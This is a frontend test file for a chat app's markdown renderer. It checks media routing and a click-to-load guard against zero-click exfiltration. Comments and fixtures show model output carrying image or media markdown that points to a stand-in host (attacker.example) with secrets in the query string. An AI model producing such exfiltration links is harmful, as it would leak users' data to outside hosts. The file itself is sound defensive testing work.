import { cleanup, fireEvent, render, screen, waitFor } from '@testing-library/react'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'

import { $connection } from '@/store/session'

import { MarkdownImage, MarkdownTextContent } from './markdown-text'

const REMOTE_IMAGE_PATH = '/home/user/project/images/remote-preview.png'
const REMOTE_IMAGE_DATA_URL = 'data:image/png;base64,cmVtb3RlLWltYWdl'

describe('MarkdownTextContent remote images', () => {
  const api = vi.fn(async ({ path }: { path: string }) => {
    if (path.startsWith('/api/fs/read-data-url?')) {
      return { dataUrl: REMOTE_IMAGE_DATA_URL }
    }

    throw new Error(`unexpected path ${path}`)
  })

  let originalDesktop: typeof window.hermesDesktop

  beforeEach(() => {
    api.mockClear()
    originalDesktop = window.hermesDesktop
    Object.defineProperty(window, 'hermesDesktop', {
      configurable: true,
      value: { api }
    })
    $connection.set({ mode: 'remote', profile: 'remote-work' } as never)
  })

  afterEach(() => {
    cleanup()
    $connection.set(null)
    Object.defineProperty(window, 'hermesDesktop', {
      configurable: true,
      value: originalDesktop
    })
  })

  it('passes the gateway bridge data URL through Streamdown to the zoomable image', async () => {
    render(<MarkdownTextContent isRunning={false} text={`![Remote preview](${REMOTE_IMAGE_PATH})`} />)

    const image = await screen.findByRole('img', { name: 'Remote preview' })

    expect(image.getAttribute('src')).toBe(REMOTE_IMAGE_DATA_URL)
    expect(api).toHaveBeenCalledWith({
      path: '/api/fs/read-data-url?path=%2Fhome%2Fuser%2Fproject%2Fimages%2Fremote-preview.png',
      profile: 'remote-work'
    })
  })
})

// Regression for #40896: generated media often arrives as image markdown
// (`![clip](clip.mp4)`). A raw <img> with a video/audio source paints a
// broken-image icon even though the file is valid, so MarkdownImage must route
// video/audio sources to the proper <video>/<audio> element.
describe('MarkdownImage media routing', () => {
  afterEach(cleanup)

  it('renders a <video> (not a broken <img>) for a video source', async () => {
    const { container } = render(<MarkdownImage alt="clip" src="file:///tmp/clip.mp4" />)

    await waitFor(() => expect(container.querySelector('video')).not.toBeNull())
    expect(container.querySelector('img')).toBeNull()
  })

  it('renders an <audio> element for an audio source', async () => {
    const { container } = render(<MarkdownImage alt="note" src="file:///tmp/note.mp3" />)

    await waitFor(() => expect(container.querySelector('audio')).not.toBeNull())
    expect(container.querySelector('img')).toBeNull()
  })

  it('still renders an <img> for an image source', () => {
    const { container } = render(<MarkdownImage alt="pic" src="file:///tmp/pic.png" />)

    expect(container.querySelector('video')).toBeNull()
    expect(container.querySelector('audio')).toBeNull()
  })
})

// Zero-click exfiltration guard: `![](https://attacker/p?d=...)` in model output
// must not fire a request until the user clicks.
describe('MarkdownImage remote images', () => {
  afterEach(cleanup)

  it('does not render an <img> for a remote http(s) source and names the host', () => {
    const { container } = render(<MarkdownImage alt="pixel" src="https://attacker.example/p?d=secret" />)

    expect(container.querySelector('img')).toBeNull()
    expect(screen.getByRole('button').textContent).toContain('attacker.example')
  })

  it('loads the remote image after a click', () => {
    const { container } = render(<MarkdownImage alt="pixel" src="https://attacker.example/p.png" />)

    fireEvent.click(screen.getByRole('button', { name: /attacker\.example/ }))

    expect(container.querySelector('img')?.getAttribute('src')).toBe('https://attacker.example/p.png')
  })

  it('keeps data: and same-origin sources auto-loading', () => {
    const data = render(<MarkdownImage alt="d" src="data:image/png;base64,ZHVtbXk=" />)

    expect(data.container.querySelector('img')?.getAttribute('src')).toBe('data:image/png;base64,ZHVtbXk=')
    cleanup()

    const same = render(<MarkdownImage alt="s" src={`${window.location.origin}/pic.png`} />)

    expect(same.container.querySelector('img')).not.toBeNull()
  })
})

// Same guard for audio/video: <audio preload=metadata> and <video> fetch the
// remote URL on render, so `![](https://attacker/x.mp3?d=...)` and MEDIA: links
// must also wait for a click.
describe('remote audio/video click-to-load', () => {
  afterEach(cleanup)

  it.each([
    ['audio', 'https://attacker.example/leak.mp3?d=secret'],
    ['video', 'https://attacker.example/leak.mp4?d=secret']
  ] as const)('does not render <%s> for a remote image-markdown source until clicked', async (tag, src) => {
    const { container } = render(<MarkdownImage alt="m" src={src} />)

    const button = await screen.findByRole('button', { name: /attacker\.example/ })

    expect(button.textContent).toContain(`Load ${tag} from`)
    expect(container.querySelector(tag)).toBeNull()

    fireEvent.click(button)

    expect(container.querySelector(tag)?.getAttribute('src')).toBe(src)
  })

  it('gates a #media: link (what MEDIA: links become) to a remote clip', async () => {
    const href = `#media:${encodeURIComponent('https://attacker.example/leak.mp4?d=secret')}`
    const { container } = render(<MarkdownTextContent isRunning={false} text={`[clip](${href})`} />)

    const button = await screen.findByRole('button', { name: /attacker\.example/ })

    expect(container.querySelector('video')).toBeNull()
    expect(container.querySelector('audio')).toBeNull()

    fireEvent.click(button)

    expect(container.querySelector('video')).not.toBeNull()
  })

  it('keeps data:, same-origin and local-file audio/video auto-loading', async () => {
    const data = render(<MarkdownImage alt="d" src="data:audio/mpeg;base64,ZHVtbXk=.mp3" />)

    await waitFor(() => expect(data.container.querySelector('audio, button')).not.toBeNull())
    cleanup()

    const same = render(<MarkdownImage alt="s" src={`${window.location.origin}/clip.mp4`} />)

    await waitFor(() => expect(same.container.querySelector('video')).not.toBeNull())
    cleanup()

    const local = render(<MarkdownImage alt="l" src="file:///tmp/clip.mp4" />)

    await waitFor(() => expect(local.container.querySelector('video')).not.toBeNull())
    expect(local.container.querySelector('button')).toBeNull()
  })
})
